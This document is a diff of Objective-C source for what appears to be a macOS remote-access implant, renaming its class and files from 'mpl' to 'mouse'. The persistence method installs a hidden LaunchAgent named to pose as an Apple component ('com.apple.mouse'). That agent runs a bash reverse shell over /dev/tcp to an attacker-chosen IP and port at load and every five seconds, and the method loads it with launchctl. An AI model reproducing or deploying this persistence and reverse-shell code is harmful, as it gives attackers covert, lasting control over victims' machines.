@@ -1,6 +1,6 @@
-#include "mpl.h"
+#include "mouse.h"
 
-@implementation mpl
+@implementation mouse
 
 @synthesize fileManager;
 NSPipe *stdinPipe;
@@ -645,10 +645,10 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
 
 
 -(void)persistence:(NSString *)args :(NSString *)ip :(int)port {
-    NSString *mplPath = @"/Library/LaunchAgents/.mpl.plist";
+    NSString *mplPath = @"/Library/LaunchAgents/.mouse.plist";
     if ([args isEqualToString:@"install"]) {
         NSDictionary *innerDict = [NSDictionary dictionaryWithObjects:
-                        [NSArray arrayWithObjects: [NSNumber numberWithBool: YES],@"com.apple.mpl",[NSNumber numberWithInt:5],[NSNumber numberWithBool: YES],
+                        [NSArray arrayWithObjects: [NSNumber numberWithBool: YES],@"com.apple.mouse",[NSNumber numberWithInt:5],[NSNumber numberWithBool: YES],
                          [NSArray arrayWithObjects:@"sh",@"-c",[NSString stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1",ip,port], nil], nil]
                         forKeys:[NSArray arrayWithObjects:@"AbandonProcessGroup",@"Label",@"StartInterval",@"RunAtLoad",@"ProgramArguments", nil]];
         NSError *err = nil;
@@ -660,10 +660,10 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
             return;
         }
         [plistData writeToFile:mplPath atomically:true];
-        [self runTask:@"sleep 1;launchctl unload /Library/LaunchAgents/.mpl.plist 2>/dev/null;;launchctl load /Library/LaunchAgents/.mpl.plist 2>/dev/null;":false];
+        [self runTask:@"sleep 1;launchctl unload /Library/LaunchAgents/.mouse.plist 2>/dev/null;;launchctl load /Library/LaunchAgents/.mouse.plist 2>/dev/null;":false];
     } else if ([args isEqualToString:@"uninstall"]) {
         if ([self.fileManager fileExistsAtPath:mplPath]) {
-            [self runTask:@"launchctl unload /Library/LaunchAgents/.mpl.plist 2>/dev/null; rm /Library/LaunchAgents/.mpl.plist 2>/dev/null;":false];
+            [self runTask:@"launchctl unload /Library/LaunchAgents/.mouse.plist 2>/dev/null; rm /Library/LaunchAgents/.mouse.plist 2>/dev/null;":false];
         }
     } else {
         [self sendString:@"Unknown Option"];
